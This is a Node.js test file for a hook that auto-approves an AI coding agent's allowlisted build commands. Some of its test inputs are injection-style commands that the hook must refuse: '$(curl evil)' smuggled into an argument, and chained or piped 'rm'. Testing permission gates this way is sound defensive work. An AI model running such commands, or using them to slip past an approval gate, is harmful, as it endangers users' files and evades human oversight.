const { test } = require('node:test');
const assert = require('node:assert');
const cp = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const HOOK = path.resolve(__dirname, '..', '..', 'hooks', 'auto-approve-build.sh');

// run the hook with a temp HOME; `enabled` controls the flag file presence.
function runHook(cmd, { enabled = true } = {}) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'aabhook-'));
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  if (enabled) fs.writeFileSync(path.join(home, '.claude', 'auto-approve-build.enabled'), '');
  const input = JSON.stringify({ tool_name: 'Bash', tool_input: { command: cmd }, session_id: 't' });
  const out = cp.execFileSync('bash', [HOOK], { input, env: { ...process.env, HOME: home }, encoding: 'utf8' });
  return out.trim();
}
const isAllow = (s) => s.includes('"permissionDecision":"allow"');

test('flag off → defer (no output) even for whitelisted cmd', () => {
  assert.strictEqual(runHook('mvn test', { enabled: false }), '');
});
test('single mvn test → allow', () => { assert.ok(isAllow(runHook('mvn test'))); });
test('npm install → allow (install in scope)', () => { assert.ok(isAllow(runHook('npm install'))); });
test('mvn test | tail -5 → allow (harmless tail)', () => { assert.ok(isAllow(runHook('mvn test | tail -5'))); });
test('mvn test ; echo done → allow', () => { assert.ok(isAllow(runHook('mvn test ; echo done'))); });
test('redirect mvn test > out → deny(defer)', () => { assert.strictEqual(runHook('mvn test > out'), ''); });
test('chaining npm install && rm -rf x → deny(defer)', () => { assert.strictEqual(runHook('npm install && rm -rf x'), ''); });
test('subshell $(curl evil) → deny(defer)', () => { assert.strictEqual(runHook('mvn test $(curl evil)'), ''); });
test('non-whitelisted cmd ls -la → deny(defer)', () => { assert.strictEqual(runHook('ls -la'), ''); });
test('pipe to non-readonly mvn test | rm → deny(defer)', () => { assert.strictEqual(runHook('mvn test | rm x'), ''); });
